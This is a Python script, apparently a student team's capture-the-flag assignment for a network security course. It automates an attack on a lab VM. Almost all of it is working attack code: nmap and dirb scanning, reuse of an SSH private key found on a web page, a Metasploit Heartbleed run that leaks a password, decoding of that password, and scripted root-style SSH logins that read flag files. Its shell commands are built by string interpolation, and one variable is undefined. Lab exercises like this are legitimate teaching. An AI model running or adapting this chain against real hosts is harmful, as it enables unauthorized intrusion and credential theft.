# Network Security - CS6903
# CTF Assignment - 9
# Team Halloween Hackers
# Kritik Agarwal - CS23MTECH11009
# Raghavendra Kulkarni - CS23MTECH11016
# Rohit Sutrave - CS23MTECH14010
# Dept. of Computer Science and Engineering
# Indian Institute of Technology, Hyderabad


# Importing required libraries and modules
import nmap
import subprocess
import pexpect
import pexpect.pxssh
import requests
import base64
from pymetasploit3.msfrpc import *
import re
import os

# Defining global variables and constants
target_vm = input("Enter the IP address of the target VM: ")
msf_port = "3000"
uname = "ns"
uroot = "hacker"
flag1_port = "3000"
msf_rc_file = "halloween_hackers.rc"
key_file = "halloween_hackers.key"


# Function to scan open ports on the target VM
def scanTarget():
    print("Scanning the target VM using nmap. This may take a few minutes. Please be patient...")
    nmScan = nmap.PortScanner()
    # Define a range of ports to scan
    nmScan.scan(target_vm, port_range)
    return nmScan

# Function to find flag1


def findFlag1(nmScan):
    global msf_port, msf_commands, flag1_port

    print("Scanning for host on the target VM...")
    for host in nmScan.all_hosts():
        print(f'Host : \033[93m{host}\033[00m {
              nmScan[host].hostname()}\tState : {nmScan[host].state()}')

    print("Scanning for open ports on the target VM...")
    for proto in nmScan[host].all_protocols():
        lport = list(nmScan[host][proto].keys())
        for port in sorted(lport):
            print(f'Port : \033[93m{port}\033[00m\tState : {
                  nmScan[host][proto][port]['state']}')
            if nmScan[host]['tcp'][port]['state'] == 'open' and port >= 1000:
                open_port = port
                url = f'http://{target_vm}:{open_port}/#1'
                response = requests.get(url)
                source_code = response.text
                pattern = r"flag1\s*{\s*(.*?)\s*}"
                match = re.search(pattern, source_code)
                if match:
                    flag = match.group(1)
                    print(
                        u'\u2713' + " Conquered the First Flag -> \033[92m flag1{" + flag + '}\033[00m')
                    flag1_port = open_port
                    msf_port = lport[1]

                else:
                    print("\033[91m" + u'\u2717' +
                          f" Flag not found on port {open_port}\033[00m")


# Function to find flag2
def findFlag2():
    print("Running dirb scan on the target VM...")
    url = f'http://{target_vm}:{flag1_port}'
    cmd = ['dirb', url]
    process = subprocess.run(cmd, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, text=True)

    if process.returncode == 0:
        print(u'\u2713' + " Dirb scan completed ...")
    else:
        print("\033[91m" + u'\u2717' +
              " Error occurred while running dirb:")
        print(process.stderr)
        print("\033[00m")
        return

    # Process the output of dirb scan to find discovered URLs
    output_lines = process.stdout.split('\n')
    discovered_urls = []
    for line in output_lines:
        if line.startswith('+ http://'):
            url_info = line.split(' ')
            discovered_urls.append(url_info[1])
            print(f"Discovered URL: \033[96m{url_info[1]}\033[00m")

    # Visit each discovered URL and search for the second flag
    for discovered_url in discovered_urls:
        print(f"Tracing {discovered_url}")
        response = requests.get(discovered_url)
        source_code = response.text
        pattern = r"flag2\s*{\s*(.*?)\s*}"
        match = re.search(pattern, source_code)

        if match:
            flag = match.group(1)
            print(
                u'\u2713' + " Conquered the Second Flag -> \033[92m flag2{" + flag + '}\033[00m')

            # Saving the key from the source code of the website to a file
            start_marker = '-----BEGIN OPENSSH PRIVATE KEY-----'
            end_marker = '-----END OPENSSH PRIVATE KEY-----'
            start_index = source_code.find(start_marker)
            end_index = source_code.find(end_marker)

            # Writing the key to a file if found in the source code of the website
            if start_index != -1 and end_index != -1:
                print(
                    "Private key found in the source code of the website, saving to file...")
                key_content = source_code[start_index:end_index +
                                          len(end_marker)] + "\n"
                bash_command = f'echo "{key_content}" > {key_file}'
                if os.path.exists(key_file):
                    os.system(f'rm {key_file}')
                os.system(bash_command)
                os.chmod(key_file, 0o700)
                print("Private key saved to file:", key_file)
            return
        else:
            print("\033[91m" + u'\u2717' +
                  " Flag not found on this page\033[00m")


# Function to find flag3
def findFlag3():
    print("Connecting to the target VM using the key...")

    try:
        ssh_command = f'ssh -i {key_file} {uname}@{target_vm}'
        ssh_session = pexpect.spawn(ssh_command, maxread=1)
        ssh_session.expect('[$#]')
        print(u'\u2713' + f" Connected to the target VM as user: {uname}")
        print("Reading the third flag...")
        ssh_session.sendline('cat flag3.txt')
        ssh_session.expect('[$#]')
        ssh_session.close()

        # Extracting the flag from the output of the SSH session
        output = ssh_session.before.decode()
        pattern = r"flag3\s*{\s*(.*?)\s*}"
        flag3 = re.search(pattern, output).group(1)
        print(
            u'\u2713' + " Conquered the Third Flag -> \033[92m flag3{" + flag3 + "}\033[00m")
    except pexpect.exceptions.TIMEOUT:
        print("\033[91m SSH session timed out...\033[00m")

    except KeyboardInterrupt:
        print("\033[91m" + u'\u2717' +
              " Keyboard interrupt detected... Exiting\033[00m")

    except Exception as e:
        print("\033[91m" + u'\u2717' +
              " Error occurred while connecting to the target VM: ")
        print(e)
        print("\033[00m")


def findPassword():
    try:
        cmd = ['msfconsole', '-q', '-r', msf_rc_file]
        process = subprocess.run(cmd, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE, text=True)
        output = process.stdout
        print(u'\u2713' + " Metasploit execution completed...")

        print("Extracting the password from the output of the Metasploit session and decoding it...")
        password = re.search(r"password=(.*?) ", output).group(1)
        print(
            u'\u2713' + " Password extracted from the Metasploit session: " + password + "")
        return password
    except AttributeError:
        password = None
        print("\033[91m" + u'\u2717' + " Password not found in the Metasploit output\033[00m")
        print("\033[91m" + u'\u2717' + " Trying again...\033[00m")
        return password


# Function to find flag4
def findFlag4():
    print("Running Metasploit to exploit the target VM with Heartbleed vulnerability. This may take a few minutes. Please be patient...")

    msf_commands = f"""use auxiliary/scanner/ssl/openssl_heartbleed
set RHOST {target_vm}
set RPORT {msf_port}
set verbose true
run
exit
"""

    if os.path.exists(msf_rc_file):
        os.system(f"rm {msf_rc_file}")

    os.system(f"echo '{msf_commands}' > {msf_rc_file}")

    try:
        password = findPassword()
        while password is None:
            password = findPassword()
        decoded_pass1 = base64.b64decode(password + "==").decode('utf-8')
        decoded_pass2 = base64.b64decode(
            decoded_pass1).decode('utf-8').replace(' ', '')
        print(u'\u2713' + " Password decoded successfully: " + decoded_pass2 + "")

        ssh_command = f'ssh {uroot}@{target_vm}'
        ssh_session = pexpect.spawn(ssh_command, maxread=1)
        ssh_session.expect(f'{uroot}@{target_vm}\'s password:')
        ssh_session.sendline(decoded_pass2)
        ssh_session.expect('[$#]')
        ssh_session.sendline('cat /home/ns/flag4.txt')
        ssh_session.expect('[$#]')
        ssh_session.close()

        output = ssh_session.before.decode()
        pattern = r"flag4\s*{\s*(.*?)\s*}"
        flag4 = re.search(pattern, output).group(1)

        print(
            u'\u2713' + " Conquered the Fourth Flag -> \033[92m flag4{" + flag4 + "}\033[00m")

    except pexpect.exceptions.TIMEOUT:
        print("SSH session timed out.")

    except AttributeError:
        print("\033[91m" + u'\u2717' +
              " Password not found in the Metasploit output\033[00m")

    except subprocess.TimeoutExpired:
        print("Metasploit execution timed out.")

    except KeyboardInterrupt:
        print("\033[91m" + u'\u2717' +
              " Keyboard interrupt detected... Exiting\033[00m")

    except Exception as e:
        print(
            u'\u2717' + " Error occurred while exploiting the target VM with Metasploit: ")
        print(e)


# Main function
if __name__ == "__main__":
    print("\033[96mRunning the Halloween hackers script... \033[00m")
    nmScan = scanTarget()
    findFlag1(nmScan)
    findFlag2()
    findFlag3()
    findFlag4()
    print("\033[96mHalloween hackers script execution completed... \033[00m")

# End of Script
